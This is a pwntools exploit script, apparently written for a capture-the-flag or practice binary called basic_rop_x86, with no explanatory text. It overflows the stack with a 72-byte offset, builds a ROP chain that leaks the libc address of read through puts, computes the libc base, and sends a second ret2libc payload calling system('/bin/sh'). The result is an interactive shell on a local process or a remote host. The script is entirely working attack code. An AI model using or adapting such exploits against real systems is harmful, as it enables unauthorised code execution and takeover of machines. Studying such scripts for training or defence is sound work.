from pwn import *

if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./basic_rop_x86", )

elf = context.binary = ELF("./basic_rop_x86", checksec=False)
libc = ELF("./libc.so.6")

context.log_level = 'debug'

offsets = 72

ret = p32(0x080483c2)
pop_esi_edi_ebp = 0x08048689

puts_plt = elf.plt['puts']
read_got = elf.got['read']

pause()

payload = b'A'*offsets
payload += p32(puts_plt)
payload += p32(pop_esi_edi_ebp)
payload += p32(read_got)
payload += p32(read_got)
payload += p32(read_got)
payload += ret 
payload += p32(elf.sym['main'])


io.sendline(payload)
io.recv(0x40)
leaked = unpack(io.recv(4))
log.info("leaked: " + hex(leaked))

libc_base = leaked - libc.sym['read'] 
log.info("libc_base: " + hex(libc_base))
shell = next(libc.search(b'/bin/sh\x00')) 
info('Shell: %#0x', shell)
bin_sh = libc_base + shell
info('/bin/sh address: %#0x', bin_sh)
system = libc_base + libc.sym['system']

info('System Address: %#0x', system)


# payload2 = flat(
#         asm('nop')*offsets,
#         system,
#         0x0,
#         bin_sh
#     )

payload2 = b'A'*offsets
payload2 += p32(system)
payload2 += b'\x00\x00\x00\x00'
payload2 += p32(bin_sh)


io.sendline(payload2)
io.interactive()
